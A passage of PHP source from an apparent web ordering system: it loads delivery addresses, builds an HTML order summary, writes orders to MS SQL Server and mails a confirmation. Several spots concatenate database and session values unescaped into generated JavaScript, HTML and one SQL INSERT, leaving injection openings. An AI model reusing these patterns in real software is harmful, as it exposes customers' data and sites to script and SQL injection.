  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
 .fast_window_in{
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:#76C1FB;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
  .logout_out{
  color:white;
  font-weight:bold;
  font-size:12px;
  font-family: verdana;
  left:10px;
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  margin-top:40px;  
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:79px;
  height:21px;
  text-align:center;
  padding-top:3px;
  background: url(./images/no.png) no-repeat left top;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
 .logout_in{
  color:white;
  font-weight:bold;
  font-size:12px;
  font-family: verdana;
  left:10px;
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  margin-top:40px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:79px;
  height:21px;
  text-align:center;
  padding-top:3px;
  background: url(./images/no.png) no-repeat left top;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}

 </style>     
     </head><body style="width:100%;height:100%;padding:0px;margin:8px;background-color:#CBCBD1;" disabled=disabled >'.$data.'</body><script src="./functions/js/data_list.js" type="text/javascript"></script></html>';   
    }
}



if (isset($_GET["load_delivery_address"])){
    $get_data="";
    require_once ("./config/mssql_dbconnect.php");
        @$sql = "SELECT * FROM dbo.[120_delivery_address] WHERE id = '".mssecuresql($_GET["load_delivery_address"])."' ";
        //program_log(@$sql,"yes",'sql.log');
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
$get_data.="var frame1_target = document.getElementById('program_body');

for ( i=14; i <= 23; i++) {
    frame1_target.contentWindow.document.getElementById('reg_value'+i).value = '';
    frame1_target.contentWindow.document.getElementById('reg_value'+i).disabled = false;
}

frame1_target.contentWindow.document.getElementById('reg_value14').value='".$row["delivery_address_name"]."';
frame1_target.contentWindow.document.getElementById('reg_value15').value='".$row["full_name"]."';
frame1_target.contentWindow.document.getElementById('reg_value16').value='".$row["company"]."';
frame1_target.contentWindow.document.getElementById('reg_value17').value='".$row["street"]."';
frame1_target.contentWindow.document.getElementById('reg_value18').value='".$row["city"]."';
frame1_target.contentWindow.document.getElementById('reg_value19').value='".$row["post_code"]."';
frame1_target.contentWindow.document.getElementById('reg_value20').value='".$row["country"]."';
frame1_target.contentWindow.document.getElementById('reg_value21').value='".$row["phone"]."';
frame1_target.contentWindow.document.getElementById('reg_value22').value='".$row["email"]."';
prepare_customer_data();
";

$_SESSION["customer_info"][14]=$row["delivery_address_name"];
$_SESSION["customer_info"][15]=$row["full_name"];
$_SESSION["customer_info"][16]=$row["company"];
$_SESSION["customer_info"][17]=$row["street"];
$_SESSION["customer_info"][18]=$row["city"];
$_SESSION["customer_info"][19]=$row["post_code"];
$_SESSION["customer_info"][20]=$row["country"];
$_SESSION["customer_info"][21]=$row["phone"];
$_SESSION["customer_info"][22]=$row["email"];
echo $get_data; 
}



if (isset($_GET["load_delivery_address_view"])){
    $get_data="";
    require_once ("./config/mssql_dbconnect.php");
        @$sql = "SELECT * FROM dbo.[120_delivery_address] WHERE id = '".mssecuresql($_GET["load_delivery_address_view"])."' ";
        //program_log(@$sql,"yes",'sql.log');
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
$get_data.="var frame1_target = document.getElementById('program_body');
frame1_target.contentWindow.document.getElementById('reg_value15').innerHTML='".$row["full_name"]."';
frame1_target.contentWindow.document.getElementById('reg_value16').innerHTML='".$row["company"]."';
frame1_target.contentWindow.document.getElementById('reg_value17').innerHTML='".$row["street"]."';
frame1_target.contentWindow.document.getElementById('reg_value18').innerHTML='".$row["city"]."';
frame1_target.contentWindow.document.getElementById('reg_value19').innerHTML='".$row["post_code"]."';
frame1_target.contentWindow.document.getElementById('reg_value20').innerHTML='".$row["country"]."';
frame1_target.contentWindow.document.getElementById('reg_value21').innerHTML='".$row["phone"]."';
frame1_target.contentWindow.document.getElementById('reg_value22').innerHTML='".$row["email"]."';
";

echo $get_data; 
}


if (@$_GET["finalize_demand"] == 4 ){
require_once ("./config/mssql_dbconnect.php");
    
   @$sql = "SELECT REPLACE(REPLACE([systemname],'".mssecuresql($_SESSION["language"])."{',''),'}',''),id
   FROM [dbo].[100_demand_marking] WHERE systemname like '".mssecuresql($_SESSION["language"])."{%'
   AND CONVERT(DATE,GETDATE(),128) >= convert(DATE,SUBSTRING([data_type], 1, CHARINDEX('-', [data_type]) - 1))
   AND CONVERT(DATE,GETDATE(),128) <= convert(DATE,SUBSTRING([data_type], CHARINDEX('-', [data_type]) + 1, 8000)) 
   ";
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );

$demand_no = substr($row[0],(StrPos ($row[0],"|")+1),strlen($row[0])) + 1;
$cycle=1;while($cycle<=(strlen($row[0]) - (StrPos ($row[0],"|")+1))):
    if ((strlen($row[0]) - (StrPos ($row[0],"|")+1))>strlen($demand_no)){$demand_no="0".$demand_no;} 
$cycle++;endwhile;

     //update demand_no
    $sql_update="UPDATE [dbo].[100_demand_marking] SET [systemname] = '".mssecuresql($_SESSION["language"]."{".substr($row[0],0,StrPos ($row[0],"|"))."|".$demand_no."}")."' WHERE id = '".mssecuresql($row[1])."' ";
    $sql_result = sqlsrv_query( $conn, $sql_update , $params, $options ) or die (dictionary("sql_command",$_SESSION["language"])." > ".print_r( sqlsrv_errors(), true));



//echo $pdf_file;
$saved_demand_no = mssecuresql(substr($row[0],0,StrPos ($row[0],"|")).substr($row[0],(StrPos ($row[0],"|")+1),strlen($row[0]))); 


// start of create HTML saved file and mail content

 $htmlbody='<div id="request_form" style="font-weight: bold;font-size:18px;font-family: verdana;color:black;" >'.dictionary('finalize_demand',@$_SESSION["language"]).'</div><p></p>
<div style="position: absolute; left: 10px; top: 80px">
<table style="border:0px;width:684px;" border=0px >
<tr><td colspan=2 style="text-align:left;" ><span style="color:black;font-weight:bold;font-size:12px;font-family: verdana;" >'.dictionary("billing_information",$_SESSION["language"]).':</span>
</td><td style="width:35px;text-align:right;" ></td><td colspan=2 style="width:300px;text-align:left;color:black;font-weight:bold;font-size:12px;font-family: verdana;" ><span style="width:119px" >'.dictionary("delivery_address",$_SESSION["language"]).'</span><span style="width:175px;text-align:right;color:black;font-weight:normal;font-size:10px;font-family: verdana;" >(
'.dictionary("different_address",$_SESSION["language"]).': <input ';
if ($_SESSION["customer_info"][0] =="on" ){$htmlbody.=' checked="checked" '; }
$htmlbody.=' id=new_delivery_address disabled=disabled type="checkbox" />)</span></td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("surname",$_SESSION["language"]).",".dictionary("name",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][1].'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][15].'</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("ic",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][2].'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][16].'</td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("company",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][3].'</span></td><td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][17].'</td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("dic",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][7].'</span></td><td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][18].'</td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("street",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][4].'</span></td>
<td style="width:35px;" ></td>
<td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][19].'</td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("city",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][5].'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][20].'</td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("post_code",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][6].'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][21].'</td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("country",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.@$_SESSION["customer_info"][10].'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][22].'</td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("phone",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][8].'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" ></td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("email",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][9].'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" ></td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("shipping",$_SESSION["language"]).': </span>
</td><td style="align:left;height:22px;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.dictionary(@$_SESSION["customer_info"][11],$_SESSION["language"]).'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" ></td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("payment_terms",$_SESSION["language"]).': </span></td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.dictionary(@$_SESSION["customer_info"][12],$_SESSION["language"]).'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" ></td></tr>

<tr><td colspan=5 style="height:10px;" ></td></tr>
<tr><td style="width:684px;" colspan=5 >
<div style="width:100%;color:black;font-weight:bold;font-size:12px;font-family: verdana;" >'.dictionary("merchant_note",$_SESSION["language"]).': </div>
<textarea disabled=disabled id=reg_value13 name=reg_value13 style="width:100%;overflow:auto;height:70px"  wrap=off >'.str_replace("<br />","\n",$_SESSION["customer_info"][13]).'</textarea>
</td></tr>
</table>
<p></p> 

<table style="width:684px;font-weight: bold;font-size:10px;font-family: verdana;color:black;margin:0px;padding:0px;" >';

     
    if (@$_SESSION["global_discount"]<>0){$price_column_description=dictionary("price_after_discount",@$_SESSION["language"]);}
        else {$price_column_description=dictionary("price",@$_SESSION["language"]);
        }
    
    $get_data.='<tr style="vertical-align:bottom;text-align:center;">
    <td style="width:30px;">'.dictionary("nr",@$_SESSION["language"]).'</td>
    <td colspan=2 style="width:140px;">'.dictionary("catalogue_number",@$_SESSION["language"]).'</td>
    <td style="width:140px;">'.dictionary("size",@$_SESSION["language"]).'</td>
    <td style="width:54px;" >'.dictionary("measurement_unit",@$_SESSION["language"]).'</td>
    <td style="width:54px;">'.dictionary("quantity",@$_SESSION["language"]).'</td>
    <td style="width:80px;">'.$price_column_description.'</td>
    <td style="width:26px;"></td>
    <td style="width:140px;">'.dictionary("total_price",@$_SESSION["language"]).'</td>
    </tr>';
    $total_amount=0;$total_VAT_amount=0;
    $cykl=0;while(@$_SESSION["product"][$cykl]):
    if (@$_SESSION["global_discount"]<>0){$final_line_price=@$_SESSION["product"][$cykl][4];
    $final_unit_price=@$_SESSION["product"][$cykl][3];}
        else {$final_line_price=@$_SESSION["product"][$cykl][2];$final_unit_price=@$_SESSION["product"][$cykl][12];
        }
        
        
        $htmlbody.='<tr style="vertical-align:bottom;" id=1_count_'.$cykl.' >
        <td style="text-align:center;vertical-align:middle;"><a href=""; style="cursor:pointer;" title="'.dictionary("open_this_product",$_SESSION["language"]).'" >'.($cykl+1).'.</a></td>
        <td colspan=2 style="text-align:left;width:140px;"><input readonly=yes id='.$cykl.'_demand_value1 name='.$cykl.'_demand_value1 value="'.@$_SESSION["product"][$cykl][7].'" type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_140_22.png) top left no-repeat;" ></td>
        <td style="text-align:center;"><input readonly=yes id='.$cykl.'_demand_value5 name='.$cykl.'_demand_value5 value="'.@$_SESSION["product"][$cykl][10].'" type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_140_22.png) top left no-repeat;" ></td>
        <td style="text-align:center;" ><input readonly=yes id='.$cykl.'_demand_value2 name='.$cykl.'_demand_value2 value="'.@$_SESSION["product"][$cykl][9].'" type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_54_22.png) top left no-repeat;" ></td>
        <td style="text-align:center;"><input readonly=yes id='.$cykl.'_demand_value3 onclick=select(); name='.$cykl.'_demand_value3 value="'.@$_SESSION["product"][$cykl][1].'" type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_54_22.png) top left no-repeat;" ></td>
        <td style="text-align:center;"><input readonly=yes id='.$cykl.'_demand_value4 name='.$cykl.'_demand_value4 value="'.$final_unit_price.'" type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_80_22.png) top left no-repeat;" ></td>
        <td style="text-align:center;"></td>
        <td style="text-align:center;"><input readonly=yes id='.$cykl.'_demand_value6 value="'.@$final_line_price.'" name='.$cykl.'_demand_value6 type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_140_22.png) top left no-repeat;" ></td>
        
        </tr>
        <tr style="vertical-align:bottom;" id=2_count_'.$cykl.' ><td colspan=2 style="width:108px;text-align:left;vertical-align:middle;">'.dictionary("note",@$_SESSION["language"]).'</td>
        <td colspan=7 style="text-align:center;" ><input readonly=yes id='.$cykl.'_demand_value7 name='.$cykl.'_demand_value7 value="'.@$_SESSION["product"][$cykl][24].'" type=text style="width:100%;height:22px;border:0px;text-align:left;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_595_22.png) top left no-repeat;" ></td>
        </tr><tr id=3_count_'.$cykl.' ><td colspan=9><p style=height:10px;margin:0px;></p></td></tr>';
        $total_amount=$total_amount+$final_line_price;
        $total_VAT_amount=$total_VAT_amount+$final_line_price;

    $cykl++;endwhile;
        $htmlbody.='</table>
 <div style="width:100%;height:10px;" > </div>
         <div style="width:100%;color:black;font-weight:bold;font-size:16px;font-family:verdana;" >
         <hr style="width:100%;" >
         <span style="width:315px;text-align:left;" >'.dictionary("total_demand_price",$_SESSION["language"]).'</span><span style="width:189px;text-align:center;color:black;font-weight:bold;font-size:12px;font-family:verdana;" >'.dictionary("total_demand_price_no_vat",$_SESSION["language"]).'</span><span style="width:40px;" > </span><span style="width:140px;text-align:center;color:black;font-weight:bold;font-size:12px;font-family:verdana;" >'.dictionary("total_demand_price_vat",$_SESSION["language"]).'</span>
         <span style="width:315px;text-align:left;" > </span><span style="width:189px;text-aling:center;" ><input readonly=YES id=total_demand_amount type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_180_22.png) top left no-repeat;" value="'.@$total_amount.' '.@$_SESSION["Currency_Id"].'" ></span><span style="width:40px;" > </span><span style="width:140px;text-align:center;" ><input readonly=YES id=total_VAT_demand_amount type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_140_22.png) top left no-repeat;" value="'.@$total_VAT_amount.' '.@$_SESSION["Currency_Id"].'" ></span>
         </div>        
 <div style="width:100%;height:10px;" > </div>
        </div>';
 

// end of create HTML saved file


    //insert demand header
    $sql="INSERT INTO [dbo].[120_demand_header] ([demand_id],[registration_id],[creation_date],[ip_address],[customer_name],[company],[ico],[dic],[street],[city],[post_code],[country],[phone],[email],[discount],[shipping],[payment_terms],[merchant_note],[delivery_full_name],[delivery_company],[delivery_street],[delivery_city],[delivery_post_code],[delivery_country],[delivery_phone],[delivery_email],[html_file])VALUES(
        '".mssecuresql(substr($row[0],0,StrPos ($row[0],"|")).substr($row[0],(StrPos ($row[0],"|")+1),strlen($row[0])))."'
        ,ISNULL((SELECT id FROM dbo.[120_registration] where login_name = '".mssecuresql(@$_SESSION[$sess_id.'logged_user'])."'),'')
        ,GETDATE(),'".mssecuresql(getIpAddress())."','".mssecuresql($_SESSION["customer_info"][1])."','".mssecuresql($_SESSION["customer_info"][3])."','".mssecuresql($_SESSION["customer_info"][2])."','".mssecuresql($_SESSION["customer_info"][7])."','".mssecuresql($_SESSION["customer_info"][4])."','".mssecuresql($_SESSION["customer_info"][5])."','".mssecuresql($_SESSION["customer_info"][6])."','".mssecuresql($_SESSION["customer_info"][10])."','".mssecuresql($_SESSION["customer_info"][8])."','".mssecuresql($_SESSION["customer_info"][9])."','".mssecuresql(@$_SESSION['global_discount'])."','".mssecuresql($_SESSION["customer_info"][11])."','".mssecuresql($_SESSION["customer_info"][12])."','".mssecuresql($_SESSION["customer_info"][13])."','".mssecuresql($_SESSION["customer_info"][15])."','".mssecuresql($_SESSION["customer_info"][16])."','".mssecuresql($_SESSION["customer_info"][17])."','".mssecuresql($_SESSION["customer_info"][18])."','".mssecuresql($_SESSION["customer_info"][19])."','".mssecuresql($_SESSION["customer_info"][20])."','".mssecuresql($_SESSION["customer_info"][21])."','".mssecuresql($_SESSION["customer_info"][22])."'
,'".$htmlbody."')";
    $sql_result = sqlsrv_query( $conn, $sql , $params, $options ) or die (dictionary("sql_command",$_SESSION["language"])." > ".print_r( sqlsrv_errors(), true));

    //insert demand items
    $cycle=0;while(@$_SESSION["product"][$cycle]):
            $demand_item="";
            for ( $temp_cycle=0 ; isset($_SESSION["product"][$cycle][$temp_cycle]); $temp_cycle++){
            $demand_item.=@$_SESSION["product"][$cycle][$temp_cycle].":";    
            }

        $sql="INSERT INTO [dbo].[120_demand_item] ([demand_id],[record],[create_date],[ip_address],[registration_id]
          ) VALUES(
          '".mssecuresql(substr($row[0],0,StrPos ($row[0],"|")).substr($row[0],(StrPos ($row[0],"|")+1),strlen($row[0])))."'
          ,'".mssecuresql($demand_item)."'
          ,GETDATE()
          ,'".mssecuresql(getIpAddress())."'
          ,ISNULL((SELECT id FROM dbo.[120_registration] where login_name = '".mssecuresql(@$_SESSION[$sess_id.'logged_user'])."'),'')
          )";
        $sql_result = sqlsrv_query( $conn, $sql , $params, $options ) or die (dictionary("sql_command",$_SESSION["language"])." > ".print_r( sqlsrv_errors(), true));
    $cycle++;endwhile;
    //end of insert demand items

$mailbody='';


$temp_language =explode("_",$_SESSION["language"]);
$temp_language='ckeditor_'.$temp_language[1];  
@$sql =  "SELECT ".mssecuresql($temp_language)." FROM dbo.[100_main_setting] WHERE [data_type] = 'demand_email_tmp' ";
     @$check = sqlsrv_query( $conn, $sql , $params, $options );
     @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );





 if (demand_mail(@$_SESSION["customer_info"][9],@$row[0],@$saved_demand_no) == false){
 // co kdyz error 
    
 } else {
 
 
 //unset($_SESSION["customer_info"]);
 //unset($_SESSION["product"]);

 $get_data ='<div style="width:100%;color:black;font-weight:bold;font-size:16px;font-family:verdana;"> '.dictionary("demand_print_&_export",$_SESSION["language"]).'</div>

<div style="text-align:center;margin-top:300px;" >

<span title="'.dictionary("pdf_file",$_SESSION["language"]).'" style="width:45px;height:62px;cursor:pointer;background: url(./images/pdf_off.png) no-repeat left top;" id="pdf_print" onmouseout=document.getElementById("pdf_print").style.background="url(\"./images/pdf_off.png\")"; onmouseover=document.getElementById("pdf_print").style.background="url(\"./images/pdf_on.png\")";  onclick=window.open("./outputs/demand_template_pdf.php?id='.base64_encode($saved_demand_no).'"); ></span>
<span style="width:10px;" ></span>

<span title="'.dictionary("html_file",$_SESSION["language"]).'" style="width:45px;height:62px;cursor:pointer;background: url(./images/html_off.png) no-repeat left top;" id="html_print" onmouseout=document.getElementById("html_print").style.background="url(\"./images/html_off.png\")"; onmouseover=document.getElementById("html_print").style.background="url(\"./images/html_on.png\")"; onclick=window.open("./outputs/demand_template_html.php?id='.base64_encode($saved_demand_no).'"); ></span>
<span style="width:10px;" ></span>

<span title="'.dictionary("xml_file",$_SESSION["language"]).'" style="width:45px;height:62px;cursor:pointer;background: url(./images/xml_off.png) no-repeat left top;" id="xml_print" onmouseout=document.getElementById("xml_print").style.background="url(\"./images/xml_off.png\")"; onmouseover=document.getElementById("xml_print").style.background="url(\"./images/xml_on.png\")"; onclick=window.open("./outputs/demand_template_xml.php?id='.base64_encode($saved_demand_no).'"); ></span></div>

';


 $get_data.='<div onclick=hidden_window_status(this.id); id=window_status style="display:inline;cursor:pointer;position: absolute; left: 125px; top: 445px; width:450px;height:60px;border:0px;text-align:center;padding:10;14;10;10px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/atypical.png) top left no-repeat;" >
<strong>'.dictionary("demand_sent",$_SESSION["language"]).'</strong></div>
<script>function delayed_hidden_window_status(value){setTimeout(function(){document.getElementById(value).style.display="none";}, 5000);}function hidden_window_status(value){document.getElementById(value).style.display="none";}</script>
 ';

 echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" href="./modules/ckeditor/shadowbox/shadowbox.css" type="text/css" media="screen" /><script src="./modules/ckeditor/shadowbox/shadowbox.js" type="text/javascript"></script><script>Shadowbox.init();var fn_items = new Array();if (document.all){document.onkeydown = function (){if (27==event.keyCode){parent.close_tab();}}}</script>
 <style>
  .fast_window_out{
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:none;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
  
 .fast_window_in{
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:#76C1FB;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
  .logout_out{
  color:white;
  font-weight:bold;
  font-size:12px;
  font-family: verdana;
  left:10px;
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  margin-top:40px;  
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:79px;
  height:21px;
  text-align:center;
  padding-top:3px;
  background: url(./images/no.png) no-repeat left top;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
 .logout_in{
  color:white;
  font-weight:bold;
  font-size:12px;
  font-family: verdana;
  left:10px;
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  margin-top:40px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:79px;
  height:21px;
  text-align:center;
  padding-top:3px;
  background: url(./images/no.png) no-repeat left top;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
 </style>
 </head><body style="width:100%;height:100%;padding:0px;margin:8px;background-image:url(\'./images/body.png\');background-repeat:no-repeat;background-attachment:fixed;background-position:center;" >'.$get_data.'</body><script src="./functions/js/data_list.js" type="text/javascript"></script></html><script>delayed_hidden_window_status("window_status");</script>';
 }      
}










if (@$_GET["finalize_demand"] == 3 ){
    require_once ("./config/mssql_dbconnect.php");
    if ($_SESSION["customer_info"][0]=="") {
        $cycle=14;while($cycle <=23):
        $_SESSION["customer_info"][$cycle]="";
        $cycle++;endwhile;
    }

$get_data='<div id="request_form" style="font-weight: bold;font-size:18px;font-family: verdana;color:black;" >'.dictionary('finalize_demand',@$_SESSION["language"]).'</div><p></p>
<div style="position: absolute; left: 10px; top: 80px">
<table style="border:0px;width:684px;" border=0px >
<tr><td colspan=2 style="text-align:left;" ><span style="color:black;font-weight:bold;font-size:12px;font-family: verdana;" >'.dictionary("billing_information",$_SESSION["language"]).':</span>
</td><td style="width:35px;text-align:right;" ></td><td colspan=2 style="width:300px;text-align:left;color:black;font-weight:bold;font-size:12px;font-family: verdana;" ><span style="width:119px" >'.dictionary("delivery_address",$_SESSION["language"]).'</span><span style="width:175px;text-align:right;color:black;font-weight:normal;font-size:10px;font-family: verdana;" >(
'.dictionary("different_address",$_SESSION["language"]).': <input ';
if ($_SESSION["customer_info"][0] =="on" ){$get_data.=' checked="checked" '; }
$get_data.=' id=new_delivery_address disabled=disabled type="checkbox" />)</span></td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("surname",$_SESSION["language"]).",".dictionary("name",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][1].'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][15].'</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("ic",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][2].'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][16].'</td></tr>

<tr><td style="width:120px;" >
